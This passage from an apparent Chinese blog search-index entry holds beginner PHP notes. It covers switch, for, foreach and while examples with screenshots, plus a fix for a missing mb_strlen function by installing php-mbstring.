<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id=$_GET[id];</span><br><span class="line"><span class="keyword">switch</span> ($id)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">  <span class="keyword">break</span>;  </span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;你输入的不是1也不是2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/10/17/dGVYoCfbvny8WB6.png" alt="image.png"><br><img src="https://i.loli.net/2020/10/17/j6qpoiHhJV2SU3W.png" alt="image.png"><br><img src="https://i.loli.net/2020/10/17/tAf7qIdz1h9enFL.png" alt="image.png"></p>
<h2 id="php中的循环语句"><a href="#php中的循环语句" class="headerlink" title="php中的循环语句"></a>php中的循环语句</h2><p><strong>for</strong>:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">10</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>($i&lt;=<span class="number">5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;小于5&#x27;</span>.$i;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;大于5&#x27;</span>.$i;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/10/17/JrXI14KoNjhEMSF.png" alt="image.png"><br><strong>foreach:</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$i = <span class="keyword">array</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>($i <span class="keyword">as</span> $a)&#123;</span><br><span class="line"><span class="keyword">echo</span> $a.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>while:</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$i = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">while</span>($i!=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $i.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$i--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/10/17/NZcHA8a16TlwEe4.png" alt="ww"></p>
<p><strong>关于一些奇奇怪怪的报错</strong>:</p>
<p>报错信息:<code>Call to undefined function mb_strlen()</code></p>
<p>解决方案:<code>yum -y install php-mbstring</code></p>
]]></content>
      <categories>
        <category>PHP</category>
        <category>开发</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>记录</tag>
      </tags>
  </entry>
</search>
